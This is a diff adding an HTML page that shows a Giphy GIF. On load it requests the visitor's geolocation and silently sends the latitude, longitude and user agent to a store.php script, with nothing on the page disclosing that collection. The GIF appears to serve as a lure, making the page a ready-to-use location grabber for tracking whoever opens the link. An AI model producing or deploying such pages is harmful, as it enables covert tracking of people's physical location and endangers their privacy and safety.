@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+
+<body onload="getLocation()">
+
+  <!-- Corrected the Giphy iframe and link -->
+  <iframe src="https://giphy.com/embed/YTJXDIivNMPuNSMgc0" width="442" height="480" frameborder="0" class="giphy-embed" allowfullscreen></iframe>
+  <p><a href="https://giphy.com/gifs/moodman-fail-life-backflip-YTJXDIivNMPuNSMgc0">via GIPHY</a></p>
+
+  <p id="demo"></p>
+
+  <script>
+    var x = document.getElementById("demo");
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else {
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }
+    }
+
+    function showPosition(position) {
+      // Create the AJAX request to send the data to the PHP script
+      const xhttp = new XMLHttpRequest();
+      xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude +
+        "&uagent=" + navigator.userAgent, true);
+      xhttp.send();
+
+      // Optionally display the location info on the webpage
+      x.innerHTML = "Latitude: " + position.coords.latitude +
+        "<br>Longitude: " + position.coords.longitude;
+    }
+  </script>
+
+</body>
+
+</html>
